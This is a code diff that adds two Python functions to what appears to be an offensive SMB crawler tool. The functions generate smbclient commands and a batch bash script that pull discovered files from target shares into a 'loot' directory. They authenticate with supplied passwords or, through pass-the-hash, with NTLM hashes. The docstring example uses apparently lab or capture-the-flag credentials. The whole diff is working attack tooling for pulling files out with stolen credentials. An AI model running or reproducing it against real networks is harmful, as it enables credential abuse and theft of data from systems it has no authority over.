@@ -516,3 +516,102 @@ def create_smb_crawler(
     )
     crawler.connect()
     return crawler
+
+
+def generate_retrieval_command(
+    file: DiscoveredFile,
+    host: str,
+    username: str,
+    password: str,
+    domain: str = "",
+    ntlm_hash: str = "",
+) -> str:
+    """
+    Generate smbclient command to retrieve a discovered file.
+
+    Args:
+        file: DiscoveredFile to retrieve
+        host: Target host/IP
+        username: Username for authentication
+        password: Password (or empty if using hash)
+        domain: Domain name (optional)
+        ntlm_hash: NTLM hash for pass-the-hash
+
+    Returns:
+        smbclient command string ready to copy/paste
+
+    Example:
+        smbclient //10.10.10.172/users$ -U 'MEGABANK.LOCAL\\SABatchJobs%SABatchJobs' -c 'get mhope/azure.xml'
+    """
+    # Extract share name from source URL (format: smb://host/share)
+    share = file.source.split('/')[-1]
+
+    # Build credential string
+    if ntlm_hash:
+        # Pass-the-hash: smbclient -U 'user%' --pw-nt-hash <hash>
+        cred_part = f"-U '{username}%' --pw-nt-hash"
+        hash_part = f" {ntlm_hash.split(':')[-1]}"  # Use NT hash part
+    else:
+        # Standard auth with domain prefix if provided
+        if domain:
+            cred_part = f"-U '{domain}\\{username}%{password}'"
+        else:
+            cred_part = f"-U '{username}%{password}'"
+        hash_part = ""
+
+    # Escape single quotes in file path
+    safe_path = file.path.replace("'", "'\\''")
+
+    return f"smbclient //{host}/{share} {cred_part}{hash_part} -c 'get {safe_path}'"
+
+
+def generate_retrieval_commands_batch(
+    files: List[DiscoveredFile],
+    host: str,
+    username: str,
+    password: str,
+    domain: str = "",
+    ntlm_hash: str = "",
+    output_dir: str = "loot",
+) -> str:
+    """
+    Generate a bash script to retrieve multiple files.
+
+    Args:
+        files: List of files to retrieve
+        host: Target host/IP
+        username: Username for authentication
+        password: Password
+        domain: Domain name
+        ntlm_hash: NTLM hash for PTH
+        output_dir: Local directory to save files
+
+    Returns:
+        Multi-line bash script for batch retrieval
+    """
+    lines = [
+        "#!/bin/bash",
+        f"# Auto-generated SMB file retrieval script",
+        f"# Target: {host}",
+        f"mkdir -p {output_dir}",
+        "",
+    ]
+
+    # Group files by share
+    by_share: Dict[str, List[DiscoveredFile]] = {}
+    for f in files:
+        share = f.source.split('/')[-1]
+        if share not in by_share:
+            by_share[share] = []
+        by_share[share].append(f)
+
+    for share, share_files in by_share.items():
+        lines.append(f"# === Share: {share} ===")
+        for f in share_files:
+            cmd = generate_retrieval_command(f, host, username, password, domain, ntlm_hash)
+            # Modify to save to output dir with flattened name
+            safe_name = f.path.replace('/', '_').replace('\\', '_')
+            lines.append(f"{cmd} && mv '{f.filename}' '{output_dir}/{safe_name}'")
+        lines.append("")
+
+    return "\n".join(lines)
